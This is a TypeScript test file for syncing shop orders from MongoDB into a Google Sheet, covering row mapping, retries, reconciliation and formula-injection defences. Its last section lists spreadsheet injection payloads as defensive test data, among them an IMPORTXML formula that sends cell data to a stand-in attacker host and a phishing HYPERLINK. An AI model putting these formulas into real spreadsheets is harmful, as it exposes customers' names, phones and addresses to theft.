import { beforeEach, describe, expect, it, vi } from 'vitest'
import { normalisePrivateKey } from '@/lib/sheets/config'
import { orderToRows, rowKey, rowsMatch, safeText, SHEET_HEADERS } from '@/lib/sheets/mapping'
import { emptyNotifications, type Order } from '@/lib/orders/schema'

/*
 * NOTHING HERE CONTACTS GOOGLE. `fetch` is stubbed for every case that would
 * reach the network, and the mapping is pure by design so most of this needs
 * no stub at all.
 *
 * What these tests are really protecting is the architectural rule: MongoDB is
 * the source of truth, the spreadsheet is a one-way projection, and a Sheets
 * failure can never touch an order.
 */

const whiteOrder: Order = {
  reference: 'NEY-0042',
  status: 'new',
  total: 300,
  payment: { method: 'pay_on_delivery', status: 'pending' },
  notifications: emptyNotifications(),
  createdAt: new Date('2026-10-05T04:30:00.000Z'), // 10:00 IST
  updatedAt: new Date('2026-10-05T04:30:00.000Z'),
  history: [{ status: 'new', at: new Date('2026-10-05T04:30:00.000Z') }],
  customer: {
    name: 'Asha Menon',
    phone: '9876543210',
    address: {
      line1: '12, Sunrise Apartments',
      line2: '4th Cross',
      area: 'Koramangala',
      city: 'Bengaluru',
      pincode: '560034',
      landmark: 'Opposite the bakery',
    },
  },
  items: [
    {
      productSlug: 'fresh-oyster-mushrooms-250g',
      name: 'Fresh White Oyster Mushrooms',
      variety: 'White oyster',
      packLabel: '250 g',
      weightGrams: 250,
      unitPrice: 100,
      quantity: 3,
    },
  ],
}

const greyItem = {
  productSlug: 'grey-oyster-mushrooms-250g',
  name: 'Fresh Grey Oyster Mushrooms',
  variety: 'Grey oyster',
  packLabel: '250 g',
  weightGrams: 250,
  unitPrice: 100,
  quantity: 2,
}

const column = (name: (typeof SHEET_HEADERS)[number]) => SHEET_HEADERS.indexOf(name)

describe('row mapping', () => {
  it('maps a white oyster order to one row', () => {
    const rows = orderToRows(whiteOrder)
    expect(rows).toHaveLength(1)
    const row = rows[0]!
    expect(row[column('Row Key')]).toBe('NEY-0042#1')
    expect(row[column('Order Reference')]).toBe('NEY-0042')
    expect(row[column('Customer Name')]).toBe('Asha Menon')
    expect(row[column('Variety')]).toBe('White oyster')
    expect(row[column('Quantity')]).toBe(3)
    expect(row[column('Unit Price (₹)')]).toBe(100)
    expect(row[column('Line Total (₹)')]).toBe(300)
    expect(row[column('Payment Status')]).toBe('Pending')
    expect(row[column('Order Status')]).toBe('New')
  })

  it('maps a grey oyster order', () => {
    const rows = orderToRows({ ...whiteOrder, items: [greyItem], total: 200 })
    expect(rows[0]![column('Variety')]).toBe('Grey oyster')
    expect(rows[0]![column('Line Total (₹)')]).toBe(200)
  })

  /*
   * One row per ITEM. This is what makes "white oyster sold today" a SUMIF
   * rather than something no formula can reach.
   */
  it('gives a multi-item order one row per item, each with its own key', () => {
    const rows = orderToRows({
      ...whiteOrder,
      items: [whiteOrder.items[0]!, greyItem],
      total: 500,
    })
    expect(rows).toHaveLength(2)
    expect(rows.map((r) => r[column('Row Key')])).toEqual(['NEY-0042#1', 'NEY-0042#2'])
    expect(rows.map((r) => r[column('Variety')])).toEqual(['White oyster', 'Grey oyster'])
    // Line totals are safe to sum; they add up to the order.
    expect(rows.reduce((sum, r) => sum + (r[column('Line Total (₹)')] as number), 0)).toBe(500)
  })

  it('carries the delivery address in full, for area reporting', () => {
    const row = orderToRows(whiteOrder)[0]!
    expect(row[column('Area')]).toBe('Koramangala')
    expect(row[column('City')]).toBe('Bengaluru')
    expect(row[column('Pincode')]).toBe("'560034")
    expect(row[column('Landmark')]).toBe('Opposite the bakery')
  })

  /*
   * Sheets reads a 10-digit string as a number, drops leading zeros and shows
   * it in scientific notation. The apostrophe is what stops that.
   */
  it('forces phone and pincode to be text', () => {
    const row = orderToRows(whiteOrder)[0]!
    expect(row[column('Phone')]).toBe("'9876543210")
    expect(String(row[column('Pincode')]).startsWith("'")).toBe(true)
  })

  it('stamps times in IST, not UTC', () => {
    const row = orderToRows(whiteOrder)[0]!
    expect(String(row[column('Created At (IST)')])).toContain('10:00')
  })

  it('reflects a paid order, with when it was paid', () => {
    const paidAt = new Date('2026-10-06T06:00:00.000Z') // 11:30 IST
    const row = orderToRows({
      ...whiteOrder,
      payment: { method: 'pay_on_delivery', status: 'paid', paidAt },
    })[0]!
    expect(row[column('Payment Status')]).toBe('Paid')
    expect(String(row[column('Paid At (IST)')])).toContain('11:30')
  })

  it('reflects a status change', () => {
    const row = orderToRows({ ...whiteOrder, status: 'out_for_delivery' })[0]!
    expect(row[column('Order Status')]).toBe('Out for delivery')
  })

  it('has a value for every header, in order', () => {
    expect(orderToRows(whiteOrder)[0]).toHaveLength(SHEET_HEADERS.length)
  })

  it('builds a stable key per line', () => {
    expect(rowKey('NEY-0001', 0)).toBe('NEY-0001#1')
    expect(rowKey('NEY-0001', 1)).toBe('NEY-0001#2')
  })
})

describe('private key handling', () => {
  /*
   * Every way of getting a PKCS#8 key into an environment variable mangles it
   * differently, and all three failures look identical at import time.
   */
  it('restores newlines written as the literal characters backslash-n', () => {
    const mangled = '-----BEGIN PRIVATE KEY-----\\nMIIE\\n-----END PRIVATE KEY-----\\n'
    expect(normalisePrivateKey(mangled)).toBe(
      '-----BEGIN PRIVATE KEY-----\nMIIE\n-----END PRIVATE KEY-----\n',
    )
  })

  it('strips quotes a dashboard paste leaves behind', () => {
    expect(normalisePrivateKey('"-----BEGIN PRIVATE KEY-----\\nX\\n-----END PRIVATE KEY-----"'))
      .toContain('-----BEGIN PRIVATE KEY-----\n')
  })

  it('removes carriage returns', () => {
    expect(normalisePrivateKey('-----BEGIN PRIVATE KEY-----\r\nX\r\n')).not.toContain('\r')
  })
})

describe('sync lifecycle', () => {
  const env = {
    GOOGLE_SHEETS_ID: 'sheet-123',
    GOOGLE_SERVICE_ACCOUNT_EMAIL: 'neyora@project.iam.gserviceaccount.com',
    // Valid base64 so the PEM parses; the signature itself is mocked below.
    GOOGLE_PRIVATE_KEY: '-----BEGIN PRIVATE KEY-----\\nQUJDRA==\\n-----END PRIVATE KEY-----\\n',
  }

  beforeEach(async () => {
    const { resetTokenCache } = await import('@/lib/sheets/auth')
    const { resetSheetReady } = await import('@/lib/sheets/sync')
    resetTokenCache()
    resetSheetReady()
  })

  const withEnv = async (values: Record<string, string | undefined>, run: () => Promise<void>) => {
    const previous = { ...process.env }
    for (const [key, value] of Object.entries(values)) {
      // DELETE rather than assign undefined: `process.env.X = undefined` stores
      // the STRING "undefined", which is truthy.
      if (value === undefined) delete process.env[key]
      else process.env[key] = value
    }
    try {
      await run()
    } finally {
      process.env = previous
    }
  }

  it('skips silently when Google is not configured', async () => {
    const { syncOrderToSheet } = await import('@/lib/sheets/sync')
    await withEnv(
      {
        GOOGLE_SHEETS_ID: undefined,
        GOOGLE_SERVICE_ACCOUNT_EMAIL: undefined,
        GOOGLE_PRIVATE_KEY: undefined,
      },
      async () => {
        expect(await syncOrderToSheet(whiteOrder)).toEqual({ ok: false, skipped: true })
      },
    )
  })

  /*
   * THE RULE: a Sheets failure must never reach the customer or the order.
   * `syncOrderToSheet` returns a result; it does not throw.
   */
  it('turns a Google failure into a result, never an exception', async () => {
    const { syncOrderToSheet } = await import('@/lib/sheets/sync')
    const realFetch = globalThis.fetch
    globalThis.fetch = (async () =>
      new Response('{"error":"invalid_grant"}', { status: 400 })) as unknown as typeof fetch

    try {
      await withEnv(env, async () => {
        const result = await syncOrderToSheet(whiteOrder)
        expect(result.ok).toBe(false)
        expect(result.skipped).toBeUndefined()
        expect(result.error).toBeTruthy()
      })
    } finally {
      globalThis.fetch = realFetch
    }
  })

  it('survives a network failure', async () => {
    const { syncOrderToSheet } = await import('@/lib/sheets/sync')
    const realFetch = globalThis.fetch
    globalThis.fetch = (async () => {
      throw new Error('getaddrinfo ENOTFOUND sheets.googleapis.com')
    }) as unknown as typeof fetch

    try {
      await withEnv(env, async () => {
        await expect(syncOrderToSheet(whiteOrder)).resolves.toMatchObject({ ok: false })
      })
    } finally {
      globalThis.fetch = realFetch
    }
  })
})

describe('idempotent upsert', () => {
  /*
   * The behaviour that stops a retry duplicating rows. The client is driven
   * with a fake Sheets API: the first run finds an empty sheet and appends;
   * the second finds the row it just wrote and UPDATES it.
   */
  const makeFakeSheets = (existingKeys: string[]) => {
    const calls: { url: string; method: string; body: unknown }[] = []
    const fetchImpl = (async (url: string, init: RequestInit = {}) => {
      const href = String(url)
      // The token request is form-encoded, every Sheets call is JSON — so the
      // body is parsed defensively rather than assumed.
      let body: unknown
      if (init.body) {
        try {
          body = JSON.parse(String(init.body))
        } catch {
          body = String(init.body)
        }
      }
      calls.push({ url: href, method: init.method ?? 'GET', body })

      if (href.includes('oauth2.googleapis.com/token')) {
        return new Response(JSON.stringify({ access_token: 'tok', expires_in: 3600 }), {
          status: 200,
        })
      }
      if (href.includes('?fields=sheets.properties.title')) {
        return new Response(JSON.stringify({ sheets: [{ properties: { title: 'Orders' } }] }), {
          status: 200,
        })
      }
      if (href.includes('!A:A') && !href.includes(':append')) {
        // Row 1 is the header; the keys follow.
        const values = [['Row Key'], ...existingKeys.map((key) => [key])]
        return new Response(JSON.stringify({ values }), { status: 200 })
      }
      return new Response('{}', { status: 200 })
    }) as unknown as typeof fetch
    return { calls, fetchImpl }
  }

  const env = {
    GOOGLE_SHEETS_ID: 'sheet-123',
    GOOGLE_SERVICE_ACCOUNT_EMAIL: 'neyora@project.iam.gserviceaccount.com',
    GOOGLE_PRIVATE_KEY: '-----BEGIN PRIVATE KEY-----\\nQUJDRA==\\n-----END PRIVATE KEY-----\\n',
  }

  const run = async (existingKeys: string[]) => {
    const { resetTokenCache } = await import('@/lib/sheets/auth')
    const { resetSheetReady, syncOrderToSheet } = await import('@/lib/sheets/sync')
    resetTokenCache()
    resetSheetReady()

    // The JWT signature is the one thing that needs a real key, and this test
    // is about row placement — so signing is stubbed out.
    vi.spyOn(crypto.subtle, 'importKey').mockResolvedValue({} as CryptoKey)
    vi.spyOn(crypto.subtle, 'sign').mockResolvedValue(new ArrayBuffer(256))

    const { calls, fetchImpl } = makeFakeSheets(existingKeys)
    const realFetch = globalThis.fetch
    globalThis.fetch = fetchImpl

    const previous = { ...process.env }
    Object.assign(process.env, env)
    try {
      const result = await syncOrderToSheet(whiteOrder)
      return { result, calls }
    } finally {
      globalThis.fetch = realFetch
      process.env = previous
      vi.restoreAllMocks()
    }
  }

  it('appends when the order is not in the sheet', async () => {
    const { result, calls } = await run([])
    expect(result.ok).toBe(true)
    const appended = calls.find((c) => c.url.includes(':append'))
    expect(appended).toBeTruthy()
    expect((appended!.body as { values: unknown[][] }).values).toHaveLength(1)
    expect(calls.some((c) => c.url.includes('values:batchUpdate'))).toBe(false)
  })

  it('UPDATES the existing row on a retry instead of appending a second one', async () => {
    const { result, calls } = await run(['NEY-0042#1'])
    expect(result.ok).toBe(true)

    // The row it already has is rewritten in place...
    const updated = calls.find((c) => c.url.includes('values:batchUpdate'))
    expect(updated).toBeTruthy()
    const data = (updated!.body as { data: { range: string }[] }).data
    // Header is row 1, so the first key sits on row 2.
    expect(data[0]!.range).toBe('Orders!A2')

    // ...and nothing is appended, so the sheet cannot grow a duplicate.
    const appended = calls.find((c) => c.url.includes(':append'))
    expect(appended === undefined || (appended.body as { values: unknown[][] }).values.length === 0)
      .toBe(true)
  })

  it('leaves other orders alone', async () => {
    const { calls } = await run(['NEY-0001#1', 'NEY-0042#1', 'NEY-0099#1'])
    const updated = calls.find((c) => c.url.includes('values:batchUpdate'))
    const data = (updated!.body as { data: { range: string }[] }).data
    expect(data).toHaveLength(1)
    // NEY-0042#1 is the second key, so spreadsheet row 3.
    expect(data[0]!.range).toBe('Orders!A3')
  })
})

describe('sheet formatting', () => {
  /*
   * Formatting is cosmetic and must never be able to break the sync. These
   * pin the two properties that guarantee that: it runs only when the tab is
   * created, and a failure is swallowed.
   */
  const env = {
    GOOGLE_SHEETS_ID: 'sheet-123',
    GOOGLE_SERVICE_ACCOUNT_EMAIL: 'neyora@project.iam.gserviceaccount.com',
    GOOGLE_PRIVATE_KEY: '-----BEGIN PRIVATE KEY-----\\nQUJDRA==\\n-----END PRIVATE KEY-----\\n',
  }

  const run = async (options: { tabExists: boolean; formatFails?: boolean }) => {
    const { resetTokenCache } = await import('@/lib/sheets/auth')
    const { resetSheetReady, syncOrderToSheet } = await import('@/lib/sheets/sync')
    resetTokenCache()
    resetSheetReady()
    vi.spyOn(crypto.subtle, 'importKey').mockResolvedValue({} as CryptoKey)
    vi.spyOn(crypto.subtle, 'sign').mockResolvedValue(new ArrayBuffer(256))

    const batchUpdates: unknown[] = []
    const realFetch = globalThis.fetch
    globalThis.fetch = (async (url: string, init: RequestInit = {}) => {
      const href = String(url)
      if (href.includes('oauth2.googleapis.com/token')) {
        return new Response(JSON.stringify({ access_token: 't', expires_in: 3600 }), {
          status: 200,
        })
      }
      if (href.includes('?fields=sheets.properties')) {
        return new Response(
          JSON.stringify({
            sheets: options.tabExists ? [{ properties: { title: 'Orders', sheetId: 7 } }] : [],
          }),
          { status: 200 },
        )
      }
      if (href.endsWith(':batchUpdate')) {
        const body = JSON.parse(String(init.body)) as { requests?: unknown[] }
        batchUpdates.push(body)
        // The addSheet reply the client reads the new sheetId from.
        if (body.requests?.some((r) => (r as { addSheet?: unknown }).addSheet)) {
          return new Response(
            JSON.stringify({ replies: [{ addSheet: { properties: { sheetId: 7 } } }] }),
            { status: 200 },
          )
        }
        if (options.formatFails) return new Response('{"error":"bad format"}', { status: 400 })
        return new Response('{}', { status: 200 })
      }
      if (href.includes('!A:A') && !href.includes(':append')) {
        return new Response(JSON.stringify({ values: [['Row Key']] }), { status: 200 })
      }
      return new Response('{}', { status: 200 })
    }) as unknown as typeof fetch

    const previous = { ...process.env }
    Object.assign(process.env, env)
    try {
      const result = await syncOrderToSheet(whiteOrder)
      return { result, batchUpdates }
    } finally {
      globalThis.fetch = realFetch
      process.env = previous
      vi.restoreAllMocks()
    }
  }

  const isFormatting = (body: unknown) =>
    (body as { requests?: { updateSheetProperties?: unknown }[] }).requests?.some(
      (r) => r.updateSheetProperties,
    ) ?? false

  it('formats the tab when it creates it', async () => {
    const { result, batchUpdates } = await run({ tabExists: false })
    expect(result.ok).toBe(true)
    expect(batchUpdates.some(isFormatting)).toBe(true)
  })

  /*
   * Never re-applied. Re-formatting on every start would stomp any column
   * width the admin set by hand.
   */
  it("leaves an existing tab's formatting alone", async () => {
    const { result, batchUpdates } = await run({ tabExists: true })
    expect(result.ok).toBe(true)
    expect(batchUpdates.some(isFormatting)).toBe(false)
  })

  it('still syncs the data when formatting fails', async () => {
    const { result } = await run({ tabExists: false, formatFails: true })
    expect(result.ok).toBe(true)
  })
})

// ---------------------------------------------------------------------------

describe('Sync All reconcile', () => {
  /*
   * The operation an admin presses to reassure themselves. Its defining
   * property is what it does NOT do: it never deletes a sheet row, even one
   * with no matching order.
   */
  const env = {
    GOOGLE_SHEETS_ID: 'sheet-123',
    GOOGLE_SERVICE_ACCOUNT_EMAIL: 'neyora@project.iam.gserviceaccount.com',
    GOOGLE_PRIVATE_KEY: '-----BEGIN PRIVATE KEY-----\\nQUJDRA==\\n-----END PRIVATE KEY-----\\n',
  }

  const orderFor = (reference: string, overrides: Partial<Order> = {}): Order => ({
    ...whiteOrder,
    reference,
    ...overrides,
  })

  /**
   * A fake Orders tab. `seed` is a list of data rows; `failOn` makes one of
   * the write calls reject so partial-failure reporting can be exercised.
   */
  const run = async (
    orders: Order[],
    seed: unknown[][] = [],
    failOn?: 'update' | 'append',
  ) => {
    const { resetTokenCache } = await import('@/lib/sheets/auth')
    const { resetSheetReady, reconcileOrders } = await import('@/lib/sheets/sync')
    resetTokenCache()
    resetSheetReady()
    vi.spyOn(crypto.subtle, 'importKey').mockResolvedValue({} as CryptoKey)
    vi.spyOn(crypto.subtle, 'sign').mockResolvedValue(new ArrayBuffer(256))

    const appended: unknown[][] = []
    const updated: { range: string; values: unknown[][] }[] = []

    const realFetch = globalThis.fetch
    globalThis.fetch = (async (url: string, init: RequestInit = {}) => {
      const href = String(url)
      if (href.includes('oauth2.googleapis.com/token')) {
        return new Response(JSON.stringify({ access_token: 't', expires_in: 3600 }), { status: 200 })
      }
      if (href.includes('?fields=sheets.properties')) {
        return new Response(
          JSON.stringify({ sheets: [{ properties: { title: 'Orders', sheetId: 7 } }] }),
          { status: 200 },
        )
      }
      if (href.includes('valueRenderOption=UNFORMATTED_VALUE')) {
        return new Response(JSON.stringify({ values: [[...SHEET_HEADERS], ...seed] }), {
          status: 200,
        })
      }
      if (href.includes('values:batchUpdate')) {
        if (failOn === 'update') return new Response('{"error":"boom"}', { status: 500 })
        updated.push(...(JSON.parse(String(init.body)).data as typeof updated))
        return new Response('{}', { status: 200 })
      }
      if (href.includes(':append')) {
        if (failOn === 'append') return new Response('{"error":"boom"}', { status: 500 })
        appended.push(...(JSON.parse(String(init.body)).values as unknown[][]))
        return new Response('{}', { status: 200 })
      }
      return new Response('{}', { status: 200 })
    }) as unknown as typeof fetch

    const previous = { ...process.env }
    Object.assign(process.env, env)
    try {
      const report = await reconcileOrders(orders)
      return { report, appended, updated }
    } finally {
      globalThis.fetch = realFetch
      process.env = previous
      vi.restoreAllMocks()
    }
  }

  /** The row the mapping would produce, as the sheet would store it back. */
  const storedRow = (order: Order, index = 0) =>
    orderToRows(order)[index]!.map((cell) => String(cell).replace(/^'/, ''))

  it('adds every row when the sheet is empty', async () => {
    const orders = [orderFor('NEY-0001'), orderFor('NEY-0002')]
    const { report, appended } = await run(orders, [])
    expect(report.ordersChecked).toBe(2)
    expect(report.rowsAdded).toBe(2)
    expect(report.rowsUpdated).toBe(0)
    expect(report.rowsUnchanged).toBe(0)
    expect(appended).toHaveLength(2)
  })

  it('changes nothing when every row already matches', async () => {
    const order = orderFor('NEY-0001')
    const { report, appended, updated } = await run([order], [storedRow(order)])
    expect(report.rowsUnchanged).toBe(1)
    expect(report.rowsAdded).toBe(0)
    expect(report.rowsUpdated).toBe(0)
    expect(appended).toHaveLength(0)
    expect(updated).toHaveLength(0)
  })

  it('adds only the orders the sheet is missing', async () => {
    const present = orderFor('NEY-0001')
    const missing = orderFor('NEY-0002')
    const { report, appended } = await run([present, missing], [storedRow(present)])
    expect(report.rowsUnchanged).toBe(1)
    expect(report.rowsAdded).toBe(1)
    expect(appended).toHaveLength(1)
    expect(String(appended[0]![1])).toBe('NEY-0002')
  })

  /* MongoDB wins. A sheet that disagrees is behind, not authoritative. */
  it('updates a row whose payment or status is out of date', async () => {
    const order = orderFor('NEY-0001')
    const stale = storedRow(order)
    const paid = orderFor('NEY-0001', {
      payment: { method: 'pay_on_delivery', status: 'paid', paidAt: new Date() },
      status: 'delivered',
    })

    const { report, updated, appended } = await run([paid], [stale])
    expect(report.rowsUpdated).toBe(1)
    expect(report.rowsAdded).toBe(0)
    expect(appended).toHaveLength(0)
    // Row 1 is the header, so the first data row is spreadsheet row 2.
    expect(updated[0]!.range).toBe('Orders!A2')
    expect(updated[0]!.values[0]).toContain('Paid')
    expect(updated[0]!.values[0]).toContain('Delivered')
  })

  /*
   * THE RULE. 30 rows in the sheet, 10 orders in the database: the other 20
   * are history and must survive untouched.
   */
  it('never deletes a sheet row that has no matching order', async () => {
    const orders = Array.from({ length: 10 }, (_, i) =>
      orderFor(`NEY-${String(i + 1).padStart(4, '0')}`),
    )
    const historical = Array.from({ length: 20 }, (_, i) => {
      const row = storedRow(orderFor(`OLD-${String(i + 1).padStart(4, '0')}`))
      row[0] = `OLD-${String(i + 1).padStart(4, '0')}#1`
      return row
    })

    const { report, appended, updated } = await run(orders, historical)
    expect(report.ordersChecked).toBe(10)
    expect(report.rowsAdded).toBe(10)
    expect(report.sheetOnlyRows).toBe(20)
    // Nothing deleted, and the 20 historical rows were never written to.
    expect(updated).toHaveLength(0)
    expect(appended).toHaveLength(10)
  })

  it('is idempotent: a second run adds nothing', async () => {
    const orders = [orderFor('NEY-0001'), orderFor('NEY-0002')]
    const first = await run(orders, [])
    expect(first.report.rowsAdded).toBe(2)

    // Feed the first run's output back in as the sheet's contents.
    const seeded = first.appended.map((row) => row.map((c) => String(c).replace(/^'/, '')))
    const second = await run(orders, seeded)
    expect(second.report.rowsAdded).toBe(0)
    expect(second.report.rowsUnchanged).toBe(2)
    expect(second.appended).toHaveLength(0)

    const third = await run(orders, seeded)
    expect(third.report.rowsAdded).toBe(0)
    expect(third.appended).toHaveLength(0)
  })

  it('never creates a second row for a Row Key it already found', async () => {
    const order = orderFor('NEY-0001')
    const { appended } = await run([order], [storedRow(order)])
    expect(appended).toHaveLength(0)
  })

  /*
   * Duplicates already in the sheet — a manual copy-paste, an older bug. They
   * are REPORTED and left alone. Deleting a business record on a guess is not
   * this button's job.
   */
  it('detects existing duplicate Row Keys without deleting them', async () => {
    const order = orderFor('NEY-0001')
    const row = storedRow(order)
    const { report, updated, appended } = await run([order], [row, [...row]])

    expect(report.duplicateKeys).toEqual(['NEY-0001#1'])
    // The first occurrence matched, so nothing was written at all.
    expect(report.rowsUnchanged).toBe(1)
    expect(appended).toHaveLength(0)
    expect(updated).toHaveLength(0)
  })

  it('updates only the first of a duplicated pair, leaving the other intact', async () => {
    const stale = storedRow(orderFor('NEY-0001'))
    const paid = orderFor('NEY-0001', {
      payment: { method: 'pay_on_delivery', status: 'paid', paidAt: new Date() },
    })
    const { report, updated } = await run([paid], [stale, [...stale]])

    expect(report.duplicateKeys).toEqual(['NEY-0001#1'])
    expect(updated).toHaveLength(1)
    // Row 2 is the first occurrence; row 3 is untouched.
    expect(updated[0]!.range).toBe('Orders!A2')
  })

  it('reports a partial failure rather than claiming success', async () => {
    const { report } = await run([orderFor('NEY-0001')], [], 'append')
    expect(report.rowsFailed).toBe(1)
    expect(report.rowsAdded).toBe(0)
    expect(report.error).toBeTruthy()
  })

  it('reports a failed update without losing the count', async () => {
    const stale = storedRow(orderFor('NEY-0001'))
    const paid = orderFor('NEY-0001', {
      payment: { method: 'pay_on_delivery', status: 'paid', paidAt: new Date() },
    })
    const { report } = await run([paid], [stale], 'update')
    expect(report.rowsFailed).toBe(1)
    expect(report.rowsUpdated).toBe(0)
  })

  it('skips cleanly when Google is not configured', async () => {
    const { resetSheetReady, reconcileOrders } = await import('@/lib/sheets/sync')
    resetSheetReady()
    const previous = { ...process.env }
    for (const key of Object.keys(env)) delete process.env[key]
    try {
      const report = await reconcileOrders([orderFor('NEY-0001')])
      expect(report.skipped).toBe(true)
      expect(report.rowsAdded).toBe(0)
    } finally {
      process.env = previous
    }
  })

  it('handles a multi-item order as several keyed rows', async () => {
    const multi = orderFor('NEY-0001', {
      items: [whiteOrder.items[0]!, greyItem],
      total: 500,
    })
    const { report, appended } = await run([multi], [])
    expect(report.ordersChecked).toBe(1)
    expect(report.rowsAdded).toBe(2)
    expect(appended.map((r) => r[0])).toEqual(['NEY-0001#1', 'NEY-0001#2'])
  })
})

describe('row comparison', () => {
  /*
   * The function that makes "already current" meaningful. It must see through
   * the apostrophe we add to force text, or every row would look changed on
   * every reconcile and the sheet would be rewritten in full each run.
   */
  it('ignores the apostrophe that forces text', () => {
    expect(rowsMatch(["9876543210"], ["'9876543210"])).toBe(true)
  })

  it('treats a number and its string form as equal', () => {
    // Sheets returns numbers for numeric cells; the mapping writes numbers.
    expect(rowsMatch([300], ['300'])).toBe(true)
  })

  it('treats blank, null and undefined as the same empty cell', () => {
    expect(rowsMatch([''], [null])).toBe(true)
    expect(rowsMatch([undefined], [''])).toBe(true)
    // A short row from Sheets (trailing empties are omitted) still matches.
    expect(rowsMatch(['a'], ['a', '', ''])).toBe(true)
  })

  it('sees a genuine change', () => {
    expect(rowsMatch(['Pending'], ['Paid'])).toBe(false)
  })
})

describe('spreadsheet formula injection', () => {
  /*
   * Every free-text cell here is typed by a CUSTOMER at checkout. Written as a
   * formula rather than text, `=IMPORTXML(...)` makes an outbound request the
   * moment an admin opens the sheet — handing the attacker whatever cells it
   * references, which is every other customer's name, phone and home address.
   *
   * These tests are the guard on that.
   */
  const hostile = (overrides: Record<string, string>): Order => ({
    ...whiteOrder,
    customer: {
      ...whiteOrder.customer,
      name: overrides.name ?? whiteOrder.customer.name,
      address: { ...whiteOrder.customer.address, ...overrides },
    },
  })

  const EXECUTABLE = /^[=+\-@\t\r]/

  it.each([
    ['IMPORTXML exfiltration', '=IMPORTXML("https://evil.example/?d="&A2,"//a")'],
    ['HYPERLINK phishing', '=HYPERLINK("https://evil.example","Payroll")'],
    ['plus prefix', '+1+1'],
    ['minus prefix', '-1+1'],
    ['at prefix', '@SUM(A1:A9)'],
    ['tab prefix', '\tcmd'],
    ['carriage return prefix', '\r=1+1'],
  ])('neutralises %s in a customer name', (_label, payload) => {
    const row = orderToRows(hostile({ name: payload }))[0]!
    const name = String(row[column('Customer Name')])
    expect(EXECUTABLE.test(name)).toBe(false)
    expect(name.startsWith("'")).toBe(true)
    // The value is preserved — it simply does not execute.
    expect(name.slice(1)).toBe(payload)
  })

  it('neutralises every address field a customer can type', () => {
    const row = orderToRows(
      hostile({ line1: '=1+1', line2: '+2', area: '-3', landmark: '@4' }),
    )[0]!
    for (const header of ['Address Line 1', 'Address Line 2', 'Area', 'Landmark'] as const) {
      expect(EXECUTABLE.test(String(row[column(header)]))).toBe(false)
    }
  })

  it('leaves no executable cell anywhere in a fully hostile order', () => {
    const row = orderToRows({
      ...hostile({ name: '=A1', line1: '=A2', line2: '+A3', area: '-A4', landmark: '@A5' }),
      items: [{ ...whiteOrder.items[0]!, name: '=A6', variety: '=A7', packLabel: '=A8' }],
    })[0]!
    const executable = row.filter((cell) => EXECUTABLE.test(String(cell)))
    expect(executable).toEqual([])
  })

  /* Ordinary values must not be littered with apostrophes. */
  it('leaves a normal value untouched', () => {
    const row = orderToRows(whiteOrder)[0]!
    expect(row[column('Customer Name')]).toBe('Asha Menon')
    expect(row[column('Area')]).toBe('Koramangala')
  })

  it('keeps money and quantity as numbers, so they can still be summed', () => {
    const row = orderToRows(whiteOrder)[0]!
    expect(typeof row[column('Quantity')]).toBe('number')
    expect(typeof row[column('Unit Price (₹)')]).toBe('number')
    expect(typeof row[column('Line Total (₹)')]).toBe('number')
  })

  /*
   * The escape must survive a reconcile: a hostile row that is already correct
   * in the sheet must compare as unchanged, or every Sync All would rewrite it.
   */
  it('compares equal after a round trip through the sheet', () => {
    const row = orderToRows(hostile({ name: '=1+1' }))[0]!
    const asStoredBySheets = row.map((cell) => String(cell).replace(/^'/, ''))
    expect(rowsMatch(asStoredBySheets, row)).toBe(true)
  })

  it('does not double-prefix a value that is already text', () => {
    expect(safeText("'already")).toBe("'already")
    expect(safeText('')).toBe('')
    expect(safeText(undefined)).toBe('')
  })
})
